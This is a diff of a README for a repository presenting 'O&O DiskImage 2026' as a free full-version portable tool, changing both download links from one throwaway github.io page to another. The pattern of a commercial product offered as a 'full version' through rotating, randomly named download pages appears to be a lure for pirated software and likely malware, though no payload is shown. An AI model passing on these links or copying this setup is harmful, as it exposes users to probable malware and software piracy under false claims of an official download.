@@ -2,7 +2,7 @@
 
 Welcome to the repository for O&O DiskImage 2026, a professional and portable disk imaging solution designed for reliable system backup, disk cloning, and data recovery. This package provides access to the full version tools needed to safeguard your Windows environment in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: The main application files are installed to the directory you choose. The too
 
 You can obtain the latest version of the O&O DiskImage 2026 tool package from the official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
